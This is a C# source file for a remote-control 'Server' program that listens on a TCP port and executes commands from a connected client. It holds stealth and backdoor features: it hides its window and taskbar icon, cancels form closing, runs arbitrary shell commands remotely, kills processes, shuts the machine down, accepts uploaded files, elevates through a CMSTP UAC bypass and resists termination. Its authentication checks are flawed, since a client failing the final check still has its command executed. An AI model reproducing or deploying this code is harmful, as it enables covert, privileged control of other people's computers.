#region "Imports"
using System;
using System.IO;
using System.Data.HashFunction.xxHash;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using NetworkCheck;
#endregion

namespace Server;

public partial class FrmMain : Form
{
    #region "Variables"
    private const string Version = "v0.0.0.1";

    private const string Host = "%host%";
    private ushort Port = 504;

    private ServerListener Server;
    private readonly RSACryptoServiceProvider RSA = new(2048);
    private readonly byte[] PublicKey;
    private readonly Pack Packer = new();

    private readonly string Auth = "%auth%";
    private readonly string FinalAuth = "%finalauth%";

    private readonly Random random = new(Guid.NewGuid().GetHashCode());

    private readonly string newLine = Environment.NewLine;
    private readonly IxxHash HashFunc = xxHashFactory.Instance.Create();

    private readonly string AppPath = Application.StartupPath;
    private const int WM_COPYDATA = 0x4A;

    private delegate void SafeSendInfo(string text);
    private delegate void SafeWriteStart();
    private delegate void SafeClearConsole();
    private delegate void SafeShowPrompt();
    private delegate void SafeWriteConsole(string Text, bool NewLine = true);
    private delegate void SafeMinimizeForm();

    private delegate void SafeShowServer();
    private delegate void SafeHideServer();

    private bool toClose = false;
    private bool toConnect = true;
    readonly AntiTaskManagerKill antiKill = new("Server");

    private const int WS_SYSMENU = 0x80000;
    #endregion

    #region "Win32 Imports"
    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern IntPtr SendMessage(IntPtr hWnd, int Msg, int wParam, IntPtr lParam);

    [DllImport("user32.dll")]
    private static extern bool SendMessage(IntPtr hWnd, int Msg, IntPtr wParam, ref CopyData lParam);

    [DllImport("User32.Dll")]
    public static extern long SetCursorPos(int x, int y);
    #endregion

    #region "Enums & Structs"
    enum PackHeader : byte
    {
        Chatter = 0,
        Authorize = 2,
        HandShake = 3,
        FileTransfer = 7
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct CopyData
    {
        public IntPtr dwData;
        public int cbData;
        public string lpData;
    }
    #endregion

    #region "Proprieties"
    private bool ToConnect
    {
        set
        {
            toConnect = value;

            if (value && !Server.Listening)
            {
                try { Server.Dispose(); } catch { }
                CreateServer();
                Server.Listen(Port);
            }
        }
        get
        {
            return toConnect;
        }
    }
    #endregion

    #region "Internal Classes"
    internal class PMData
    {
        public int Command;
        public int Arg;

        public PMData(int Command, int Arg)
        {
            this.Command = Command;
            this.Arg = Arg;
        }
    }

    internal static class ExternalCommands
    {
        public static int PM_PLAY = 0xFFF0;
        public static int PM_PAUSE = 0xFFF1;
        public static int PM_STOP = 0xFFF2;
        public static int PM_FORWARD = 0xFFF3;
        public static int PM_BACKWARD = 0xFFF4;
        public static int PM_NEXT = 0xFFF5;
        public static int PM_PREVIOUS = 0xFFF6;
        public static int PM_VOLUMEUP = 0xFFF7;
        public static int PM_VOLUMEDOWN = 0xFFF8;
        public static int PM_MUTE = 0xFFF9;
        public static int PM_AUTOPLAY = 0xFFFA;
        public static int PM_FILE = 0xFFFB;
        public static int PM_EMPTY = 0xFFFF;
    }
    #endregion

    #region "Functions"
    public FrmMain(string[] args)
    {
        InitializeComponent();

        ProcessArgs(args);

        this.FormClosing += (sender, e) => { if (!toClose) e.Cancel = true; };

        ConsoleMain.BackColor = Color.Black;
        ConsoleMain.CommandEntered += ConsoleMain_CommandEntered;
        WriteStart();

        PublicKey = RSA.ExportCspBlob(false);

        CreateServer();

        StartThread(() =>
        {
            Server.Listen(Port);
        });
        
        NetworkStatus.AvailabilityChanged += NetworkStatus_AvailabilityChanged;
    }

    protected override CreateParams CreateParams
    {
        get
        {
            CreateParams cp = base.CreateParams;
            cp.Style &= ~WS_SYSMENU;
            return cp;
        }
    }

    private void HideServer()
    {
        if (this.InvokeRequired)
        {
            var d = new SafeHideServer(HideServer);
            this.Invoke(d, new object[] { });
        }
        else
        {
            this.Opacity = 0;
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.Hide();
        }
    }

    private void ShowServer()
    {
        if (this.InvokeRequired)
        {
            var d = new SafeShowServer(ShowServer);
            this.Invoke(d, new object[] { });
        }
        else
        {
            this.Show();
            this.ShowIcon = true;
            this.ShowInTaskbar = true;
            this.Opacity = 100;
        }
    }

    private void MinimizeForm()
    {
        if (this.InvokeRequired)
        {
            var d = new SafeMinimizeForm(MinimizeForm);
            this.Invoke(d, new object[] { });
        }
        else
        {
            this.WindowState = FormWindowState.Minimized;
        }
    }

    private void ProcessArgs(string[] args)
    {
        if (args.Count() > 0)
        {
            for (int i = 0; i < args.Count(); i++)
            {
                switch (args[i])
                {
                    case "-hide":

                        HideServer();
                        break;

                    case "-show":

                        ShowServer();
                        break;

                    case "-port":

                        if (args.Count() >= i + 2)
                        {
                            if (IsNumeric(args[i + 1]))
                            {
                                Port = Convert.ToUInt16(args[i + 1]);
                            }
                        }

                        break;

                    default:
                        continue;
                }
            }
        }
    }

    private bool IsAdmin()
    {
        WindowsPrincipal Principal = new(WindowsIdentity.GetCurrent());
        return Principal.IsInRole(WindowsBuiltInRole.Administrator);
    }

    public void ExecuteAsAdmin(string fileName)
    {
        Process proc = new();
        proc.StartInfo.FileName = fileName;
        proc.StartInfo.UseShellExecute = true;
        proc.StartInfo.Verb = "runas";
        proc.Start();
    }

    public void ExecuteAsUser(string fileName)
    {
        Process proc = new();
        proc.StartInfo.FileName = fileName;
        proc.StartInfo.UseShellExecute = true;
        proc.Start();
    }

    private int RandomNumber(int Min, int Max)
    {
        if (Min > Max)
            return random.Next(Max, Min + 1);

        if (Min == Max)
            return Min;

        return random.Next(Min, Max + 1);
    }

    private string RandomString(int Length)
    {
        const string pool = "abcdefghijklmnopqrstuvwxyz0123456789";
        var chars = Enumerable.Range(0, Length).Select(x => pool[random.Next(0, pool.Length)]);
        return new string(chars.ToArray());
    }

    private void SendInfo(string DataToSend)
    {
        if (this.InvokeRequired)
        {
            var d = new SafeSendInfo(SendInfo);
            this.Invoke(d, new object[] { DataToSend });
        }
        else
        {
            foreach (Process cProcess in Process.GetProcesses())
            {
                if (cProcess.ProcessName.ToLower() == "pmedia")
                {
                    PMData FinalData = DataToPMData(DataToSend);

                    SendMessage(cProcess.MainWindowHandle, FinalData.Command, FinalData.Arg, IntPtr.Zero);
                }
                else if (cProcess.ProcessName.ToLower() == "privatemediaplayer")
                {
                    string fDataToSend = "::" + DataToSend;

                    CopyData data = new()
                    {
                        lpData = fDataToSend,
                        cbData = fDataToSend.Length * Marshal.SystemDefaultCharSize
                    };

                    SendMessage(cProcess.MainWindowHandle, WM_COPYDATA, this.Handle, ref data);
                }
            }
        }
    }

    private PMData DataToPMData(string Data)
    {
        if (Data == "play")
            return new PMData(ExternalCommands.PM_PLAY, 0);

        else if (Data == "pause")
            return new PMData(ExternalCommands.PM_PAUSE, 0);

        else if (Data == "forward")
            return new PMData(ExternalCommands.PM_FORWARD, 0);

        else if (Data == "backward")
            return new PMData(ExternalCommands.PM_BACKWARD, 0);

        else if (Data == "stop")
            return new PMData(ExternalCommands.PM_STOP, 0);

        else if (Data == "next")
            return new PMData(ExternalCommands.PM_NEXT, 0);

        else if (Data == "previous")
            return new PMData(ExternalCommands.PM_PREVIOUS, 0);

        else if (Data.StartsWith("volumeup") == true)
            return new PMData(ExternalCommands.PM_VOLUMEUP, Convert.ToInt32(Data.Split(" ".ToCharArray()).Last()));

        else if (Data.StartsWith("volumedown") == true)
            return new PMData(ExternalCommands.PM_VOLUMEDOWN, Convert.ToInt32(Data.Split(" ".ToCharArray()).Last()));

        else if (Data == "mute")
            return new PMData(ExternalCommands.PM_MUTE, 0);

        else if (Data == "autoplay")
            return new PMData(ExternalCommands.PM_AUTOPLAY, 0);

        return new PMData(ExternalCommands.PM_EMPTY, 0);
    }

    private string GetActiveWindowTitle()
    {
        const int nChars = 256;
        StringBuilder Buff = new(nChars);
        IntPtr handle = GetForegroundWindow();

        if (GetWindowText(handle, Buff, nChars) > 0)
        {
            return Buff.ToString();
        }
        return null;
    }

    private Process GetActiveProcess()
    {
        try
        {
            IntPtr hWnd = GetForegroundWindow();
            if (hWnd == IntPtr.Zero)
                return null;

            GetWindowThreadProcessId(hWnd, out uint pid);
            if (pid == 0)
                return null;

            return Process.GetProcessById(Convert.ToInt32(pid));
        }
        catch
        {
            return null;
        }
    }

    private string AppList()
    {
        try
        {
            string appList = string.Empty;

            foreach (var app in Process.GetProcesses())
            {
                appList += app.ProcessName + " - " + app.Id.ToString() + newLine;
            }

            return appList.Trim();
        }
        catch
        {
            return "app list error";
        }
    }

    private string VolumeAppList()
    {
        string appList = string.Empty;
        var apps = VolumeMixer.EnumerateApplications();

        foreach (var app in apps)
        {
            if (app.ProcessID == 0)
                continue;

            appList += app.Name + " - " + app.ProcessID + " - " + app.Volume * 100 + newLine;
        }

        return appList.Trim();
    }

    private void StartThread(ThreadStart threadStart)
    {
        Thread newThread = new(threadStart)
        { IsBackground = true };
        newThread.SetApartmentState(ApartmentState.STA);
        newThread.Start();
    }

    private bool IsNumeric(string input)
    {
        return int.TryParse(input, out _);
    }

    private void CreateServer()
    {
        Server = new ServerListener() { MaxConnections = 5000, KeepAlive = true, BufferSize = 32768, MaxPacketSize = 1073741824 };

        Server.StateChanged += Server_StateChanged;
        Server.ClientStateChanged += Server_ClientStateChanged;
        Server.ExceptionThrown += Server_ExceptionThrown;
        Server.ClientExceptionThrown += Server_ClientExceptionThrown;
        Server.ClientReadPacket += Server_ClientReadPacket;
    }

    private void WriteStart()
    {
        if (ConsoleMain.InvokeRequired)
        {
            var d = new SafeWriteStart(WriteStart);
            ConsoleMain.Invoke(d, new object[] { });
        }
        else
        {
            ConsoleMain.WriteText($"Server {Version}" + newLine);
            ConsoleMain.WriteText("Use the command 'help' if you need help!" + newLine + newLine);

            //ShowPrompt();
            ConsoleMain.WriteText("> ");
        } 
    }

    private void ShowPrompt()
    {
        if (ConsoleMain.InvokeRequired)
        {
            var d = new SafeShowPrompt(ShowPrompt);
            ConsoleMain.Invoke(d, new object[] { });
        }
        else
        {
            ConsoleMain.WriteText(ConsoleMain.Prompt);
        } 
    }

    private void ClearConsole()
    {
        if (ConsoleMain.InvokeRequired)
        {
            var d = new SafeClearConsole(ClearConsole);
            ConsoleMain.Invoke(d, new object[] { });
        }
        else
        {
            ConsoleMain.Clear();
        }   
    }

    private void WriteConsole(string Text, bool NewLine = true)
    {
        if (ConsoleMain.InvokeRequired)
        {
            var d = new SafeWriteConsole(WriteConsole);
            ConsoleMain.Invoke(d, new object[] { Text, NewLine });
        }
        else
        {
            string currentDate = $"[{DateTime.Now}] ";

            ConsoleMain.WriteText(currentDate + Text + newLine);
            if (NewLine) ConsoleMain.WriteText(newLine);
            //ShowPrompt();
            ConsoleMain.WriteText("> ");
        }
    }

    private void SendResponse(string Response, ServerClient Client)
    {
        if (Client != null)
            SendChatterPacket(Client, Response);
    }

    private void RunCMD(string Command, ServerClient Client)
    {
        string FileToRun = "@echo off" + newLine + "@title ServerCMD" + newLine + "@color 1a" + newLine + Command.Trim().Replace("/n", newLine).Trim(); //+ newLine + @"DEL ""%~f0""";
        System.IO.File.WriteAllText(AppPath + @"\temp.bat", FileToRun, Encoding.ASCII);
        Process oProcess = new();
        ProcessStartInfo oStartInfo = new(AppPath + @"\temp.bat") { UseShellExecute = false, RedirectStandardOutput = true, RedirectStandardError = true, CreateNoWindow = true };
        oProcess.StartInfo = oStartInfo;
        oProcess.Start();
        string sOutput = string.Empty;

        using (System.IO.StreamReader oStreamReader = oProcess.StandardOutput)
        { sOutput = oStreamReader.ReadToEnd(); }

        sOutput += newLine;

        using (System.IO.StreamReader oStreamReader = oProcess.StandardError)
        { sOutput += oStreamReader.ReadToEnd(); }

        WriteConsole(sOutput);
        SendResponse(sOutput, Client);
        System.IO.File.Delete(AppPath + @"\temp.bat");
    }

    private void RunShutdownCMD(string Command)
    {
        Process p = new();

        ProcessStartInfo pi = new()
        {
            Arguments = Command,
            FileName = "shutdown.exe",
            CreateNoWindow = false,
            WindowStyle = ProcessWindowStyle.Hidden
        };

        p.StartInfo = pi;
        p.Start();
    }

    private void ExecuteCommand(string Command, ServerClient Client)
    {
        Command = Command.Trim();
        int ndx = Command.IndexOf(' ');
        string cmd = ndx < 0 ? Command : Command[..ndx];
        string[] parameters = ndx < 0 ? new string[0] : Command.Remove(0, ndx + 1).Split(" ".ToCharArray());

        switch (cmd.ToLower().Trim())
        {
            case "show":

                ShowServer();

                SendResponse("Show OK", Client);
                WriteConsole("Show OK");

                break;

            case "hide":

                HideServer();

                SendResponse("Hide OK", Client);
                WriteConsole("Hide OK");

                break;

            case "help":

                string mainHelp = Properties.Resources.Help;
                mainHelp = mainHelp.Trim();
                mainHelp = mainHelp.Replace(newLine, newLine + ConsoleMain.Prompt);

                SendResponse(mainHelp, Client);
                WriteConsole(mainHelp);

                break;

            case "clear":

                SendResponse(":c", Client);
                ClearConsole();
                WriteStart();

                break;

            case "close":

                toClose = true;
                ToConnect = false;

                Server.Dispose();
                this.Invoke((MethodInvoker)delegate { this.Close(); });

                break;

            case "connect":

                try { Server.Dispose(); } catch { }
                CreateServer();
                Server.Listen(Port);

                SendResponse("Connect OK", Client);
                WriteConsole("Connect OK");

                break;

            case "disconnect":

                try { Server.Dispose(); } catch { }

                SendResponse("Disconnect OK", Client);
                WriteConsole("Disconnect OK");

                break;

            case "cmd":

                RunCMD(string.Join(" ", parameters), Client);
                break;

            case "shutdown":

                RunShutdownCMD(string.Join(" ", parameters));

                SendResponse("Shutdown OK", Client);
                WriteConsole("Shutdown OK");

                break;

            case "apps":

                string appList = AppList();
                appList = appList.Replace(newLine, newLine + ConsoleMain.Prompt);

                SendResponse(appList, Client);
                WriteConsole(appList);

                break;

            case "admin":

                bool isElevated = IsAdmin();

                SendResponse($"Admin - {isElevated}", Client);
                WriteConsole($"Admin - {isElevated}");

                break;

            case "bit":

                string bitSize = Environment.Is64BitProcess ? "64 bit" : "32 bit";

                SendResponse($"App - {bitSize}", Client);
                WriteConsole($"App - {bitSize}");

                break;

            case "memory":

                GC.Collect();

                SendResponse("Memory OK", Client);
                WriteConsole("Memory OK");

                break;

            case "getactivewindow":

                string title = GetActiveWindowTitle();

                SendResponse($"Active Window - {title}", Client);
                WriteConsole($"Active Window - {title}");

                break;

            case "killactivewindow":

                Process activeProc = GetActiveProcess();

                if (activeProc != null)
                {
                    activeProc.Kill();

                    SendResponse("Active Window Killed", Client);
                    WriteConsole("Active Window Killed");
                }
                else
                {
                    SendResponse("Active Window not found", Client);
                    WriteConsole("Active Window not found");
                }

                break;

            case "kill":

                if (parameters.Count() == 1)
                {
                    if (IsNumeric(parameters[0]))
                    {
                        int ProcID = Convert.ToInt32(parameters[0]);
                        Process currentProc = null;

                        try { currentProc = Process.GetProcessById(ProcID); } catch { };

                        if (currentProc == null)
                        {
                            SendResponse("Process not found", Client);
                            WriteConsole("Process not found");
                            break;
                        }

                        currentProc.Kill();

                        SendResponse("Process killed", Client);
                        WriteConsole("Process killed");
                    }
                    else
                    {
                        string ProcName = parameters[0];
                        Process[] currentProc = null;

                        try { currentProc = Process.GetProcessesByName(ProcName); } catch { };

                        if (currentProc == null)
                        {
                            SendResponse("Process not found", Client);
                            WriteConsole("Process not found");
                            break;
                        }

                        foreach (var Proc in currentProc)
                        {
                            Proc.Kill();
                        }

                        SendResponse("Process killed", Client);
                        WriteConsole("Process killed");
                    }
                }
                else
                {
                    SendResponse("Kill - command invalid", Client);
                    WriteConsole("Kill - command invalid");
                }

                break;

            case "volume":

                if (parameters.Count() <= 0)
                {
                    string currentVolume = Convert.ToInt32(VolumeMixer.GetMasterVolume() * 100).ToString();

                    SendResponse($"Volume {currentVolume}", Client);
                    WriteConsole($"Volume {currentVolume}");

                    break;
                }

                if (parameters[0] == "list")
                {
                    string volumeList = VolumeAppList();
                    volumeList = volumeList.Replace(newLine, newLine + ConsoleMain.Prompt);

                    SendResponse(volumeList, Client);
                    WriteConsole(volumeList);
                }
                else if (IsNumeric(parameters[0]))
                {
                    float newVolume = float.Parse(parameters[0], CultureInfo.InvariantCulture.NumberFormat);
                    newVolume /= 100;

                    VolumeMixer.SetMasterVolume(newVolume);

                    SendResponse("Volume set", Client);
                    WriteConsole("Volume set");
                }
                else if (parameters[0] == "app")
                {
                    if (parameters.Count() != 3)
                    {
                        SendResponse("Volume - invalid command", Client);
                        WriteConsole("Volume - invalid command");
                        break;
                    }

                    if (IsNumeric(parameters[1]))
                    {
                        int ProcID = Convert.ToInt32(parameters[1]);
                        float newVolume = float.Parse(parameters[2], CultureInfo.InvariantCulture.NumberFormat);

                        VolumeMixer.SetApplicationVolume(ProcID, newVolume);

                        SendResponse("Volume app set", Client);
                        WriteConsole("Volume app set");
                    }
                    else
                    {
                        string ProcName = parameters[1];
                        float newVolume = float.Parse(parameters[2], CultureInfo.InvariantCulture.NumberFormat);

                        VolumeMixer.SetApplicationVolume(ProcName, newVolume);

                        SendResponse("Volume app set", Client);
                        WriteConsole("Volume app set");
                    }
                }

                break;

            case "pmp":

                string finalPmpCommand = string.Join(" ", parameters);
                SendInfo(finalPmpCommand);

                SendResponse("PMP ok", Client);
                WriteConsole("PMP ok");

                break;

            case "rnd":

                int rndResult = 0;

                if (parameters.Count() == 0)
                {
                    rndResult = RandomNumber(0, 100);
                }
                else if (parameters.Count() == 2)
                {
                    rndResult = RandomNumber(Convert.ToInt32(parameters[0]), Convert.ToInt32(parameters[1]));
                }

                SendResponse($"Random - {rndResult}", Client);
                WriteConsole($"Random - {rndResult}");

                break;

            case "screen":

                if (parameters.Count() == 1)
                {
                    if (parameters[0] == "off")
                    {
                        RunCMD(@"%systemroot%\system32\scrnsave.scr /s", Client);

                        SendResponse("Screen Off", Client);
                        WriteConsole("Screen Off");

                        break;
                    }
                    else if (parameters[0] == "on")
                    {
                        SetCursorPos(RandomNumber(100, 800), RandomNumber(100, 800));

                        SendResponse("Screen On", Client);
                        WriteConsole("Screen On");

                        break;
                    }
                }

                SendResponse("Screen - Invalid command", Client);
                WriteConsole("Screen - Invalid command");

                break;

            case "runas":

                if (parameters.Count() >= 2)
                {
                    if (parameters[0] == "admin")
                    {
                        string runAsPath = string.Join(" ", parameters.Skip(1));

                        if (IsAdmin())
                        {
                            ExecuteAsAdmin(runAsPath);
                        }
                        else
                        {
                            CMSTPBypass.Execute(runAsPath);
                        }

                        SendResponse("RunAs OK", Client);
                        WriteConsole("RunAs OK");

                        break;
                    }
                    else if (parameters[0] == "user")
                    {
                        string runAsPath = string.Join(" ", parameters.Skip(1));

                        ExecuteAsUser(runAsPath);

                        SendResponse("RunAs OK", Client);
                        WriteConsole("RunAs OK");

                        break;
                    }
                }

                SendResponse("RunAs - Invalid command", Client);
                WriteConsole("RunAs - Invalid command");

                break;

            case "toconnect":

                if (parameters.Count() >= 2)
                {
                    try
                    {
                        bool newToConnect = Convert.ToBoolean(parameters[1]);
                        ToConnect = newToConnect;
                        break;
                    }
                    catch
                    {
                        SendResponse("ToConnect - Bool only", Client);
                        WriteConsole("ToConnect - Bool only");

                        break;
                    }
                }

                SendResponse("ToConnect - Invalid command", Client);
                WriteConsole("ToConnect - Invalid command");

                break;

            case "protect":

                if (parameters.Count() != 1)
                {
                    WriteConsole("Unkown command " + cmd);
                    SendResponse("Unkown command " + cmd, Client);
                    break;
                }

                string protectCmd = parameters[0];

                if (protectCmd == "yes")
                {
                    string startResult = antiKill.Start();

                    WriteConsole("Protect - " + startResult);
                    SendResponse("Protect - " + startResult, Client);
                    break;
                }
                else if (protectCmd == "no")
                {
                    string stopResult = antiKill.Stop();

                    WriteConsole("Protect - " + stopResult);
                    SendResponse("Protect - " + stopResult, Client);
                    break;
                }
                else if (protectCmd == "?1")
                {
                    string protect1Result = antiKill.IsRunning(AntiTaskManagerKill.SearchMethod.Process);

                    WriteConsole("Protect - " + protect1Result);
                    SendResponse("Protect - " + protect1Result, Client);
                    break;
                }
                else if (protectCmd == "?2")
                {
                    string protect2Result = antiKill.IsRunning(AntiTaskManagerKill.SearchMethod.File);

                    WriteConsole("Protect - " + protect2Result);
                    SendResponse("Protect - " + protect2Result, Client);
                    break;
                }

                SendResponse("Unkown command " + cmd, Client);
                WriteConsole("Unkown command " + cmd);
                break;

            case "minimize":

                MinimizeForm();

                WriteConsole("Minimize - OK");
                SendResponse("Minimize - OK", Client);

                break;

            default:

                SendResponse("Unkown command " + cmd, Client);
                WriteConsole("Unkown command " + cmd);
                break;
        }
    }

    private void SendTo(ServerClient Client, params object[] Args)
    {
        if (Client != null)
        {
            byte[] Data = Packer.Serialize(Args);

            if (Client.UserState.SecureConnection == true)
                Data = Client.UserState.Encrypt(Data);

            Client.Send(Data);
        }
    }

    private void SendHandshakePacket(ServerClient Client, byte[] PublicKey)
    {
        SendTo(Client, Convert.ToByte(PackHeader.HandShake), PublicKey);
    }

    private void SendChatterPacket(ServerClient Client, string Message)
    {
        SendTo(Client, Convert.ToByte(PackHeader.Chatter), Message);
    }

    private void SendFileTransferPacket(ServerClient Client, string FilePath)
    {
        string FileName = new FileInfo(FilePath).Name;
        byte[] FileData = File.ReadAllBytes(FilePath);

        SendTo(Client, Convert.ToByte(PackHeader.FileTransfer), FileName, FileData);
    }

    private void HandleHandShakePacket(ServerClient Client, object[] Values)
    {
        byte[] Data = (byte[])Values[1];
        Data = RSA.Decrypt(Data, true);

        object[] Param = Packer.Deserialize(Data);
        byte[] Key = (byte[])Param[0];
        byte[] IV = (byte[])Param[1];

        Client.UserState.PrepareEncryption(Key, IV);
        Client.UserState.SecureConnection = true;

        WriteConsole("Client Authenticated");
        SendChatterPacket(Client, "Connected");
    }

    private void HandleAuthorizePacket(ServerClient Client, object[] Values)
    {
        string Auth = (string)Values[1];

        if (Auth == this.Auth)
        {
            SendHandshakePacket(Client, PublicKey);
        }
        else
        {
            Client.Dispose();
            WriteConsole("Client Authentication Failed");
        }
    }

    private void HandleChatterPacket(ServerClient Client, object[] Values)
    {
        if (Values.Count() != 3)
        {
            Client.Dispose();
        }

        string FinalAuth = (string)Values[2];

        if (FinalAuth != this.FinalAuth)
            Client.Dispose();

        string Message = (string)Values[1];

        StartThread(() => ExecuteCommand(Message, Client));
    }

    private void HandleFileTransfer(ServerClient Client, object[] Values)
    {
        WriteConsole("File Transfer");

        if (Client.UserState.SecureConnection)
        {
            string FileName = Values[1].ToString();
            byte[] FileData = (byte[])Values[2];

            if (!Directory.Exists(AppPath + @"/Downloads"))
                Directory.CreateDirectory(AppPath + @"/Downloads");

            string FilePath = AppPath + @"/Downloads/" + FileName;

            for (; ; )
            {
                if (!File.Exists(FilePath))
                    break;

                FilePath = AppPath + @"/Downloads/" + RandomString(10) + FileName;
            }

            File.WriteAllBytes(FilePath, FileData);
        }
    }
    #endregion

    #region "Handles"
    private void ConsoleMain_CommandEntered(object sender, ConsoleControl.CommandEnteredEventArgs e)
    {
        StartThread(() => ExecuteCommand(e.Command, null));
    }

    private void NetworkStatus_AvailabilityChanged(object sender, NetworkStatusChangedArgs e)
    {
        if (e.IsAvailable)
        {
            if (!ToConnect)
                return;

            try { Server.Dispose(); } catch { }
            CreateServer();
            Server.Listen(Port);
        }
        else
        {
            try { Server.Dispose(); } catch { }
        }
    }

    private void Server_StateChanged(ServerListener Sender, bool Listening)
    {
        if (Listening)
        {
            WriteConsole($"Listening [{Port}]");
        }
        else
        {
            if (!ToConnect)
                return;

            WriteConsole(@"Server disconnected, retrying...");

            Thread.Sleep(3000);

            Server.Listen(Port);
        }
    }

    private void Server_ClientStateChanged(ServerListener Sender, ServerClient Client, bool Connected)
    {
        if (Connected)
        {
            Client.UserState = new User();
            WriteConsole("Client Connected. Waiting Authentication", false);
        }
        else
        {
            WriteConsole("Client Disconnected");
        }
    }

    private void Server_ClientReadPacket(ServerListener Sender, ServerClient Client, byte[] Data)
    {
        Client.UserState ??= new User();

        if (Client.UserState.SecureConnection)
            Data = Client.UserState.Decrypt(Data);

        object[] Values = Packer.Deserialize(Data);

        if (Values == null || Values.Count() == 0)
        {
            WriteConsole("Error: Client has invalid values");
            Client.Disconnect();
        }

        switch ((byte)Values[0])
        {
            case (byte)PackHeader.HandShake:
                HandleHandShakePacket(Client, Values);
                break;

            case (byte)PackHeader.Authorize:
                HandleAuthorizePacket(Client, Values);
                break;

            case (byte)PackHeader.Chatter:
                HandleChatterPacket(Client, Values);
                break;

            case (byte)PackHeader.FileTransfer:
                HandleFileTransfer(Client, Values);
                break;
        }
    }

    private void Server_ExceptionThrown(ServerListener Sender, Exception Ex)
    {
        if (!ToConnect)
            return;

        try { Server.Dispose(); } catch { }
        CreateServer();
        Server.Listen(Port);
    }

    private void Server_ClientExceptionThrown(ServerListener sender, ServerClient Client, Exception Ex)
    {
        WriteConsole("Client error");
        try { Client.Dispose(); } catch { }
    }
    #endregion
}